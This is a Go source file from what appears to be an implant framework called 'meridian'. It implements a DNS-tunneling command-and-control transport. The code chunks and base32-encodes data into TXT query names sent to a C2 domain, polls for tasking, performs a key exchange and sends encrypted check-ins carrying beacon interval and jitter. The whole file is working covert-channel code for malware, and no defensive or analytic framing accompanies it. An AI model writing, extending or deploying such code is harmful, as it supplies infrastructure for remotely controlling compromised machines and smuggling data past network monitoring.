package mtransport

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"meridian/implant/internal/mcrypto"
)

const (
	dnsChunkSize = 36 // payload bytes per upload query (36 -> 58 base32 chars)
	dnsPollSleep = 250 * time.Millisecond
)

// DNS implements Transport over TXT queries (multi-query chunked messaging,
// see docs/protocol.md section 6).
type DNS struct {
	server  string // host:port of the DNS listener
	domain  string
	timeout time.Duration
}

// NewDNS builds a DNS transport. server is host:port, domain is the C2 base.
func NewDNS(server, domain string, timeout time.Duration) *DNS {
	return &DNS{server: server, domain: strings.TrimSuffix(domain, "."), timeout: timeout}
}

func (t *DNS) Name() string { return "dns" }

// query sends one TXT query and returns the TXT strings.
func (t *DNS) query(name string) ([]string, error) {
	var idBytes [2]byte
	if _, err := rand.Read(idBytes[:]); err != nil {
		return nil, err
	}
	id := uint16(idBytes[0])<<8 | uint16(idBytes[1])
	pkt, err := buildQuery(id, name, 16)
	if err != nil {
		return nil, err
	}
	conn, err := net.Dial("udp", t.server)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	if _, err := conn.Write(pkt); err != nil {
		return nil, err
	}
	conn.SetReadDeadline(time.Now().Add(t.timeout))
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}
	resp, err := parseResponse(buf[:n])
	if err != nil {
		return nil, err
	}
	if resp.ID != id {
		return nil, errors.New("dns: transaction id mismatch")
	}
	var out []string
	for _, a := range resp.Answers {
		out = append(out, a.TXT...)
	}
	if len(out) == 0 {
		return nil, errors.New("dns: empty answer")
	}
	return out, nil
}

// sendMultiUpload splits payload into CHUNK_SIZE pieces and uploads each.
func (t *DNS) sendMultiUpload(marker, msgid string, payload []byte) error {
	for i := 0; i < len(payload); i += dnsChunkSize {
		end := i + dnsChunkSize
		if end > len(payload) {
			end = len(payload)
		}
		name := fmt.Sprintf("%s.%s.%d.%s.%s", marker, msgid, i/dnsChunkSize, mcrypto.B32E(payload[i:end]), t.domain)
		recs, err := t.query(name)
		if err != nil {
			return err
		}
		if len(recs) != 1 || recs[0] != "ok" {
			return fmt.Errorf("dns: upload rejected (%v)", recs)
		}
	}
	return nil
}

// pollBytes polls for a message reply until ready or timeout.
func (t *DNS) pollBytes(msgid string) ([]byte, error) {
	deadline := time.Now().Add(t.timeout)
	for {
		recs, err := t.query(fmt.Sprintf("g.%s.%s", msgid, t.domain))
		if err != nil {
			return nil, err
		}
		if len(recs) == 1 && recs[0] == "P" {
			if time.Now().After(deadline) {
				return nil, errors.New("dns: poll timeout")
			}
			time.Sleep(dnsPollSleep)
			continue
		}
		return reassemble(recs)
	}
}

func reassemble(recs []string) ([]byte, error) {
	var sb strings.Builder
	for i, r := range recs {
		if i == 0 {
			parts := strings.SplitN(r, ":", 3)
			if len(parts) < 3 {
				return nil, fmt.Errorf("dns: bad first record %q", r)
			}
			sb.WriteString(parts[2])
			continue
		}
		idx := strings.Index(r, ":")
		if idx < 0 {
			return nil, fmt.Errorf("dns: bad record %q", r)
		}
		sb.WriteString(r[idx+1:])
	}
	return base64.StdEncoding.DecodeString(sb.String())
}

func randomMsgID() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "deadbeef"
	}
	return hex.EncodeToString(b)
}

func (t *DNS) Kex(clientPubB64, clientNonceB64 string) (*KexReply, error) {
	pub, err := mcrypto.B64D(clientPubB64)
	if err != nil {
		return nil, err
	}
	nonce, err := mcrypto.B64D(clientNonceB64)
	if err != nil {
		return nil, err
	}
	frame := make([]byte, 0, 1+len(pub)+len(nonce))
	frame = append(frame, mcrypto.FrameKex)
	frame = append(frame, pub...)
	frame = append(frame, nonce...)
	msgid := randomMsgID()
	if err := t.sendMultiUpload("uk", msgid, frame); err != nil {
		return nil, err
	}
	reply, err := t.pollBytes(msgid)
	if err != nil {
		return nil, err
	}
	if len(reply) < 1+16+32+16+2+1 || reply[0] != mcrypto.FrameKex {
		return nil, errors.New("dns: bad kex reply")
	}
	return &KexReply{
		SessionID:   hex.EncodeToString(reply[1:17]),
		ServerPub:   base64.StdEncoding.EncodeToString(reply[17:49]),
		ServerNonce: base64.StdEncoding.EncodeToString(reply[49:65]),
		Interval:    int(reply[65])<<8 | int(reply[66]),
		Jitter:      float64(reply[67]) / 100,
	}, nil
}

func (t *DNS) Checkin(sessionID string, envelope map[string]string) (map[string]string, error) {
	nonce, err := mcrypto.B64D(envelope["nonce"])
	if err != nil {
		return nil, err
	}
	ct, err := mcrypto.B64D(envelope["ct"])
	if err != nil {
		return nil, err
	}
	frame := make([]byte, 0, 1+len(nonce)+len(ct))
	frame = append(frame, mcrypto.FrameCheckin)
	frame = append(frame, nonce...)
	frame = append(frame, ct...)
	if err := t.sendMultiUpload("uc", sessionID, frame); err != nil {
		return nil, err
	}
	reply, err := t.pollBytes(sessionID)
	if err != nil {
		return nil, err
	}
	// The DNS reply envelope is framed compact; split into nonce|ct (b64).
	if len(reply) < 1+mcrypto.NonceLen+16 || reply[0] != mcrypto.FrameCheckin {
		return nil, errors.New("dns: bad checkin reply")
	}
	return map[string]string{
		"nonce": base64.StdEncoding.EncodeToString(reply[1 : 1+mcrypto.NonceLen]),
		"ct":    base64.StdEncoding.EncodeToString(reply[1+mcrypto.NonceLen:]),
	}, nil
}
